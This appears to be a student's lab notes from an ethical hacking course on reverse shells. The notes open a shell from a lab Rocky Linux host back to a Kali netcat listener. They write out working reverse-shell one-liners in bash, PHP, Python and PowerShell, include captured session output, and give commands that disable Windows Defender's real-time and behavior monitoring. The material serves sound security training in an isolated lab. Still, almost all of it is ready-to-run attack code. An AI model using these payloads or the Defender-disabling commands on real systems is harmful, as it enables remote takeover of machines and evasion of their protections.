# Reverse Shells

## basics / bash reverse shell
1. Login to sec335-rocky(10.0.17.200) from kali using ssh and your cyber.local credentials.
```
ssh charlotte.croce@cyber.local@10.0.17.200
```
2. Determine your IP address for your kali vm's eth0 (10.0.17.26)
3. On Kali, Create a nc listener on 4449/tcp
```
nc -nlvp 4449
```
5. On Rocky Use a native bash reverse shell to connect back to your listener
```
/bin/bash -i >& /dev/tcp/10.0.17.26/4449 0>&1
```
7. Interact with sec335-rocky over your kali nc session.
```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week09/sqli-labs-php7]
└─$ nc -nlvp 4449
listening on [any] 4449 ...
connect to [10.0.17.26] from (UNKNOWN) [10.0.17.200] 56900
[charlotte.croce@cyber.local@sec335-rocky ~]$ whoami
whoami
charlotte.croce@cyber.local
```

## php reverse shell
```
<?php
shell_exec('/bin/bash -i >& /dev/tcp/10.0.17.26/4449 0>&1');
?>
```

## python reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.26",4449));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## powershell reverse shell
```
$client = New-Object System.Net.Sockets.TCPClient('10.0.17.26',4449);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### disable windows defender
windows defender will block reverse shells by default, so you have to disable it
```
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
```

